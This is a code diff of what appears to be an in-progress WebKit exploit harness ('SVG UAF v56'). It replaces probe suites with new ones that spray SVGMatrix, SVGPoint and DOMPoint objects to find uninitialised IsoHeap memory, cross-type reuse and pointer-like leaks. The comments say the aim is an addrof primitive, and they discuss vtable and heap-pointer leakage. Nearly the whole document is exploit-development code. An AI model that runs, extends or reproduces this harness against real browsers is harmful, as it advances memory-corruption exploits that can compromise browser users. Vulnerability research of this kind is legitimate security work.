-  L('ADR15: [P3] fresh SVGAngle IsoHeap uninit probe...');
-  var angleHits=0;
-  for(var k=0;k<200;k++){
+  var hits18b=[];
+  for(var k=0;k<N;k++){
     var svg2=makeSVG();
-    var mk2=document.createElementNS(SVG_NS,'marker');
-    mk2.setAttribute('orient','0deg');
-    svg2.appendChild(mk2);
-    var a2=mk2.orientAngle.baseVal;
-    var initVal=a2.value;
-    var initUnit=a2.unitType;
-    // unitType=1(deg), value=0 is expected for "0deg"
-    if(initVal!==0){
-      angleHits++;
-      if(angleHits<=5) L('ADR15: [P3] ★ angle['+k+'] initVal='+initVal+' bits='+f64hex(initVal),'hit');
+    var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
+    var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
+    var m2=g2.transform.baseVal.getItem(0).matrix;
+    var snap2={a:m2.a,b:m2.b,c:m2.c,d:m2.d,e:m2.e,f:m2.f};
+    if(snap2.a!==1||snap2.b!==0||snap2.c!==0||snap2.d!==1||snap2.e!==0||snap2.f!==0){
+      hits18b.push(k);
+      if(hits18b.length<=8){
+        L('ADR18: [T3] ★ matrix['+k+']: e='+snap2.e+' '+f64hex(snap2.e),'hit');
+        L('ADR18: [T3] ★ a='+snap2.a+' d='+snap2.d+' bits a='+f64hex(snap2.a),'hit');
+      }
     }
-    if(initUnit!==1){
-      angleHits++;
-      if(angleHits<=5) L('ADR15: [P3] ★ angle['+k+'] initUnit='+initUnit+' (expected 1=deg)','hit');
+    for(var field of['a','b','c','d','e','f']){
+      if(isPointerLike(snap2[field])){
+        L('ADR18: [T3] ★★ ['+k+'].'+field+'='+snap2[field]+' PTR-LIKE!','hit');
+      }
     }
-    mk2.parentNode.removeChild(mk2);removeSVG(svg2);
+    g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
   }
-  L('ADR15: [P3] non-default SVGAngles='+angleHits+'/200'+(angleHits>0?' ★ UNINIT!':'clean'));
+  L('ADR18: [T3] DOMRect→SVGMatrix hits='+hits18b.length+'/'+N+(hits18b.length>0?' ★ CROSS-TYPE!':'clean'));
 
-  // Phase 4: SVGAngle.valueAsString — does it ever expose raw C++ data?
-  L('ADR15: [P4] SVGAngle.valueAsString probe...');
-  var svg3=makeSVG();
-  var mk3=document.createElementNS(SVG_NS,'marker');
-  mk3.setAttribute('orient','123.456deg');svg3.appendChild(mk3);
-  var a3=mk3.orientAngle.baseVal;
-  L('ADR15: [P4] valueAsString='+a3.valueAsString+' valueInSpecifiedUnits='+a3.valueInSpecifiedUnits);
-  L('ADR15: [P4] bits of valueInSpecifiedUnits='+f64hex(a3.valueInSpecifiedUnits));
-  // valueInSpecifiedUnits is the stored float — is it f32 or f64?
-  var tv=123.456;
-  a3.valueInSpecifiedUnits=tv;
-  L('ADR15: [P4] wrote '+tv+' → readback='+a3.valueInSpecifiedUnits+' isF32='+(a3.valueInSpecifiedUnits===Math.fround(tv)));
-  mk3.parentNode.removeChild(mk3);removeSVG(svg3);
+  // Test 4: SVGMatrix → DOMPoint (reverse)
+  L('ADR18: [T4] SVGMatrix→DOMPoint reverse cross-type...');
+  var CANARY_M=6.66666666e14;
+  (function matSpray(){
+    for(var k=0;k<N;k++){
+      var svg3=makeSVG();
+      var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
+      var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
+      var m3=g3.transform.baseVal.getItem(0).matrix;
+      m3.a=CANARY_M;m3.b=CANARY_M/2;m3.c=CANARY_M/3;m3.d=CANARY_M/4;m3.e=CANARY_M/5;m3.f=CANARY_M/6;
+      g3.transform.baseVal.removeItem(0);g3.parentNode.removeChild(g3);removeSVG(svg3);
+    }
+  })();
+  gcPressure(400000);
 
-  L('ADR15: done');
+  var domHits=0;
+  for(var k=0;k<N;k++){
+    var dp2=new DOMPoint();
+    if(dp2.x!==0||dp2.y!==0||dp2.z!==0||dp2.w!==1){
+      domHits++;
+      if(domHits<=5) L('ADR18: [T4] ★ DOMPoint['+k+']: x='+dp2.x+' y='+dp2.y+' z='+dp2.z+' w='+dp2.w,'hit');
+      if(isPointerLike(dp2.x)) L('ADR18: [T4] ★★ x PTR-LIKE!','hit');
+    }
+  }
+  L('ADR18: [T4] dirty DOMPoints='+domHits+'/'+N+(domHits>0?' ★ CROSS-TYPE!':'clean'));
+
+  L('ADR18: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR16: SVGRect + SVGPoint orphan — new primitives, new oracle paths
+// ADR20 — SVGMatrix.translate/scale return value leak
 //
-// SVGRect: {x, y, width, height} — 4 floats? or 4 float64s?
-// SVGPoint: {x, y} — 2 floats? or 2 float64s?
+// SVGMatrix.translate(tx,ty) creates a NEW SVGMatrix C++ object.
+// SVGMatrix.scale(s) creates a NEW SVGMatrix C++ object.
+// SVGMatrix.rotate(angle) creates a NEW SVGMatrix C++ object.
+// SVGMatrix.multiply(other) creates a NEW SVGMatrix C++ object.
 //
-// SVGPoint.matrixTransform(matrix) → new SVGPoint
-// If SVGPoint uses float64 internally, we have TWO more registers.
-// And: SVGPoint.matrixTransform on an orphaned SVGMatrix gives us
-// a new SVGPoint computed from C++ matrix fields.
+// These are computed results. The C++ allocates a fresh AffineTransform
+// and returns it. If it comes from an IsoHeap slot that had previous
+// data... the computed result might have unexpected bits.
 //
-// SVGRect: createSVGRect() → rect.x, rect.y, rect.width, rect.height
-// These might be float64 because SVGRect is used for bounding boxes
-// which need double precision.
+// Specifically: if the NEW SVGMatrix object's memory wasn't zeroed,
+// and the computation only writes to SOME fields (e.g. translate
+// only writes e and f, leaving a,b,c,d from the slot), then reading
+// the full 6 fields of the result gives us leftover data.
+//
+// BUT: C++ initializes the new AffineTransform to identity in the
+// constructor. So we'd only see leakage if the constructor fails
+// to write all fields... which is unlikely.
+//
+// Better angle: translate()/scale() return the result as a NEW JS
+// SVGMatrix object. What is the C++ object's vtable pointer?
+// If we can read vtable+0 offset from the object's memory, that's
+// a code pointer. The inverse() oracle reads float64 fields starting
+// at offset +8 (after vtable+refcount). What if we read what's at
+// offset 0 (vtable)?
+//
+// We can't do that directly. BUT: if the IsoHeap page layout puts
+// field 'a' at byte 0 of the object (no vtable prefix because
+// AffineTransform is a plain struct wrapped in SVGMatrix), then
+// what IS at the start?
+//
+// AffineTransform layout (WebKit source):
+// double m_transform[6] = {a, b, c, d, e, f}
+// So a IS at offset 0 of AffineTransform. No vtable in AffineTransform.
+// The vtable is in SVGMatrix (the JS wrapper), not AffineTransform.
+// So all 6 fields are pure float64 data. No vtable to leak.
+//
+// NEW IDEA for ADR20: use translate() to probe what value the
+// IsoHeap gives for the NEWLY allocated result object before
+// the constructor fills it. This requires a race or a way to
+// observe the object pre-construction. Not directly possible.
+//
+// REAL ADR20: instead probe SVGMatrix fields via JSON.stringify /
+// toString / object spread to see if any hidden property leaks
+// C++ internals. Also test: does structuredClone(matrix) expose
+// anything different?
 // ─────────────────────────────────────────────────────────────────
-function runADR16(){
-  L('','suite-hdr');L('ADR16: SVGRect/SVGPoint orphan — float precision + new oracle paths');
+function runADR20(){
+  L('','suite-hdr');L('ADR20: SVGMatrix introspection / hidden property / structuredClone probe');
 
-  // Test 1: SVGPoint precision
   var svg=makeSVG();
-  var pt=svg.createSVGPoint();
-  var f64val=1234567890.123456789;
-  pt.x=f64val;pt.y=f64val;
-  L('ADR16: [T1] SVGPoint.x: wrote='+f64val+' read='+pt.x+' isF64='+(pt.x===f64val)+' isF32='+(pt.x===Math.fround(f64val)));
-  L('ADR16: [T1] bits: wrote='+f64hex(f64val)+' got='+f64hex(pt.x));
+  var m=svg.createSVGMatrix();
+  m.a=1;m.b=0;m.c=0;m.d=1;m.e=0x1b0dead0000;m.f=0x1b0cafe0000;
 
-  // Test 2: SVGPoint orphan — stays alive after svg removal?
-  var svg2=makeSVG();
-  var pt2=svg2.createSVGPoint();
-  pt2.x=9999.9999;pt2.y=8888.8888;
-  var x0=pt2.x;
-  removeSVG(svg2);
-  L('ADR16: [T2] SVGPoint after svg-remove: x='+pt2.x+' ALIVE='+(pt2.x===x0));
-  // Write after orphan
-  pt2.x=1234567;
-  L('ADR16: [T2] SVGPoint write after orphan: x='+pt2.x+' WRITABLE='+(pt2.x===1234567));
-
-  // Test 3: SVGRect precision
-  var svg3=makeSVG();
-  var rect=svg3.createSVGRect();
-  rect.x=f64val;rect.y=f64val;rect.width=f64val;rect.height=f64val;
-  L('ADR16: [T3] SVGRect.x: wrote='+f64val+' read='+rect.x+' isF64='+(rect.x===f64val)+' isF32='+(rect.x===Math.fround(f64val)));
-  L('ADR16: [T3] bits: wrote='+f64hex(f64val)+' got='+f64hex(rect.x));
-
-  // Test 4: SVGPoint.matrixTransform with orphaned matrix
-  // If we set matrix.e=K (e and f are translation fields), then
-  // pt.matrixTransform(m) → result.x = m.a*pt.x + m.c*pt.y + m.e
-  // With pt.x=0, pt.y=0, m=identity except m.e=K → result.x=K
-  var m=getOrphanedMatrix();
-  var K=0x1b00001234; // test value (arm64 heap range)
-  m.a=1;m.b=0;m.c=0;m.d=1;m.e=K;m.f=0;
-  var pt3=svg.createSVGPoint();pt3.x=0;pt3.y=0;
+  // Test 1: What properties does SVGMatrix actually expose?
+  var keys=[];
+  for(var k in m) keys.push(k);
+  L('ADR20: [T1] for..in keys: '+keys.join(', '));
+  L('ADR20: [T1] Object.keys: '+Object.keys(m).join(', '));
   try{
-    var res=pt3.matrixTransform(m);
-    L('ADR16: [T4] pt.matrixTransform(orphanedMatrix): result.x='+res.x+' expected='+K+' exact='+(res.x===K));
-    L('ADR16: [T4] bits: expected='+f64hex(K)+' got='+f64hex(res.x));
-    // This confirms: matrixTransform works on orphaned matrices
-    // AND it returns a float64-precision result (SVGPoint.x is f64)
-  }catch(ex){L('ADR16: [T4] matrixTransform: '+ex.message,'warn');}
+    var desc=Object.getOwnPropertyDescriptors(m);
+    L('ADR20: [T1] own props: '+Object.keys(desc).join(', '));
+  }catch(ex){L('ADR20: [T1] getOwnPropertyDescriptors: '+ex.message,'warn');}
 
-  // Test 5: Can we use SVGPoint.matrixTransform to READ the matrix fields?
-  // Set matrix to identity, read known field values through matrixTransform
-  var m2=getOrphanedMatrix();
-  var SECRET_E=0x1b0deadbeef; // distinctive value we write to m.e
-  var SECRET_F=0x1b0cafebabe; // distinctive value we write to m.f
-  m2.a=1;m2.b=0;m2.c=0;m2.d=1;m2.e=SECRET_E;m2.f=SECRET_F;
+  // Test 2: Symbol properties
+  var syms=Object.getOwnPropertySymbols(m);
+  L('ADR20: [T2] symbol props: '+syms.length+(syms.length>0?' '+syms.map(String).join(' '):''));
 
-  // Read e via: pt=(0,0) → result.x = m.e
-  var ptA=svg.createSVGPoint();ptA.x=0;ptA.y=0;
+  // Test 3: prototype chain — does it expose anything useful?
+  var proto=Object.getPrototypeOf(m);
+  L('ADR20: [T3] proto: '+proto);
+  var protoKeys=proto?Object.getOwnPropertyNames(proto):[];
+  L('ADR20: [T3] proto methods: '+protoKeys.join(', '));
+
+  // Test 4: Does SVGMatrix have a toJSON or toString that leaks?
+  L('ADR20: [T4] toString: '+m.toString());
+  try{L('ADR20: [T4] JSON: '+JSON.stringify(m));}catch(ex){L('ADR20: [T4] JSON error: '+ex.message,'warn');}
+
+  // Test 5: structuredClone — does the clone have same precision?
   try{
-    var rA=ptA.matrixTransform(m2);
-    L('ADR16: [T5] read e via matrixTransform: result.x='+rA.x+' expected='+SECRET_E+' exact='+(rA.x===SECRET_E));
-    // Read f via: pt=(0,0) → result.y = m.f (m.b*0 + m.d*0 + m.f)
-    // Actually result.y = m.b*0 + m.d*pt.y + m.f = m.f when pt.y=0
-    L('ADR16: [T5] read f via matrixTransform: result.y='+rA.y+' expected='+SECRET_F+' exact='+(rA.y===SECRET_F));
-    L('ADR16: [T5] e bits: expected='+f64hex(SECRET_E)+' got='+f64hex(rA.x));
-    L('ADR16: [T5] f bits: expected='+f64hex(SECRET_F)+' got='+f64hex(rA.y));
-  }catch(ex){L('ADR16: [T5] '+ex.message,'warn');}
+    var clone=structuredClone(m);
+    L('ADR20: [T5] clone.e='+clone.e+' bits='+f64hex(clone.e)+' exact='+(clone.e===0x1b0dead0000));
+    L('ADR20: [T5] clone.f='+clone.f+' bits='+f64hex(clone.f)+' exact='+(clone.f===0x1b0cafe0000));
+  }catch(ex){L('ADR20: [T5] structuredClone: '+ex.message,'warn');}
 
-  // Test 6: getBBox() — reads C++ layout geometry, returns SVGRect
-  // getBBox() on a rendered element returns the bounding box as computed
-  // by the layout engine. The returned SVGRect's fields come from C++
-  // layout floats. Could they ever contain heap pointers? Unlikely but fast to check.
-  L('ADR16: [T6] getBBox probe...');
-  var svg4=makeSVG();svg4.style.width='100px';svg4.style.height='100px';
-  var rect4=document.createElementNS(SVG_NS,'rect');
-  rect4.setAttribute('x','10');rect4.setAttribute('y','20');
-  rect4.setAttribute('width','50');rect4.setAttribute('height','30');
-  svg4.appendChild(rect4);
+  // Test 6: Proxy trap — can we intercept property access on SVGMatrix?
+  // If we wrap SVGMatrix in a Proxy, do internal C++ accesses go through it?
   try{
-    var bb=rect4.getBBox();
-    L('ADR16: [T6] getBBox: x='+bb.x+' y='+bb.y+' w='+bb.width+' h='+bb.height);
-    for(var field of['x','y','width','height']){
-      if(isPointerLike(bb[field])) L('ADR16: [T6] ★★ getBBox.'+field+'='+bb[field]+' PTR-LIKE!','hit');
+    var accessLog=[];
+    var proxy=new Proxy(m,{
+      get:function(t,p){
+        accessLog.push('get:'+String(p));
+        return t[p];
+      },
+      set:function(t,p,v){
+        accessLog.push('set:'+String(p)+'='+v);
+        t[p]=v;return true;
+      }
+    });
+    // Call inverse() on the proxy — does WebKit use the proxy fields or the C++ fields?
+    var inv=proxy.inverse();
+    L('ADR20: [T6] proxy.inverse() works: a='+inv.a);
+    L('ADR20: [T6] proxy access log: '+accessLog.join(', '));
+    // Does inverse() access a,b,c,d,e,f through JS property getters?
+    // If accessLog shows get:a get:b get:c get:d get:e get:f → JS path (interceptable!)
+    // If accessLog is empty → C++ reads direct from AffineTransform memory (expected)
+    if(accessLog.length>0){
+      L('ADR20: [T6] ★ inverse() goes through JS getters! count='+accessLog.length,'hit');
+    } else {
+      L('ADR20: [T6] inverse() reads C++ directly (expected), proxy unobservable');
     }
-  }catch(ex){L('ADR16: [T6] getBBox: '+ex.message,'warn');}
-  removeSVG(svg4);
+  }catch(ex){L('ADR20: [T6] Proxy: '+ex.message,'warn');}
 
-  // Test 7: SVGPoint spray — check initial values before setting
-  L('ADR16: [T7] fresh SVGPoint IsoHeap probe...');
-  var ptHits=0;
-  for(var k=0;k<200;k++){
-    var svgX=makeSVG();
-    var ptX=svgX.createSVGPoint();
-    // x and y start at 0 by spec — but does IsoHeap give us zeros?
-    if(ptX.x!==0||ptX.y!==0){
-      ptHits++;
-      if(ptHits<=5) L('ADR16: [T7] ★ pt['+k+'] x='+ptX.x+' '+f64hex(ptX.x)+' y='+ptX.y+' '+f64hex(ptX.y),'hit');
-      if(isPointerLike(ptX.x)) L('ADR16: [T7] ★★ x PTR-LIKE! oracle='+inverseOracle(ptX.x),'hit');
-      if(isPointerLike(ptX.y)) L('ADR16: [T7] ★★ y PTR-LIKE! oracle='+inverseOracle(ptX.y),'hit');
-    }
-    removeSVG(svgX);
-  }
-  L('ADR16: [T7] nonzero fresh SVGPoints='+ptHits+'/200'+(ptHits>0?' ★ UNINIT!':'clean'));
+  // Test 7: Can we define a getter on SVGMatrix instance to intercept C++ reads?
+  try{
+    var m2=svg.createSVGMatrix();
+    m2.a=1;m2.d=1;m2.e=1234567890;m2.f=9876543210;
+    var eRead=false;
+    Object.defineProperty(m2,'e',{
+      get:function(){eRead=true;return 999999;},
+      configurable:true
+    });
+    var inv2=m2.inverse();
+    L('ADR20: [T7] after defineProperty on .e: getter called='+eRead);
+    L('ADR20: [T7] inverse.a='+(inv2?inv2.a:'null')+' (if getter worked, should use 999999, not 1234567890)');
+    // If getter intercepted: inv.a=1/999999 * determinant correction
+    // If C++ reads direct: inv.a computed from real C++ m_transform[4]
+  }catch(ex){L('ADR20: [T7] defineProperty: '+ex.message,'warn');}
 
-  removeSVG(svg);removeSVG(svg3);
-  L('ADR16: done');
+  removeSVG(svg);
+  L('ADR20: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-var suites={ADR13:runADR13,ADR14:runADR14,ADR15:runADR15,ADR16:runADR16};
-
+var suites={ADR17:runADR17,ADR18:runADR18,ADR19:runADR19,ADR20:runADR20};
 function runSuite(name){
   L('=== '+name+' ===','suite-hdr');
   try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+(ex.stack||''),'miss');}
   L('=== '+name+' done ===','info');
 }
-
 function runAll(){
   clearOut();
-  L('SVG UAF v55 — addrof attempts','suite-hdr');
+  L('SVG UAF v56 — IsoHeap reuse + standalone matrix','suite-hdr');
   L('----------------------------------------------------');
   var names=Object.keys(suites);
   var i=0;
   function next(){
     if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
     runSuite(names[i++]);
-    setTimeout(next,100);
+    setTimeout(next,150);
   }
   next();
 }
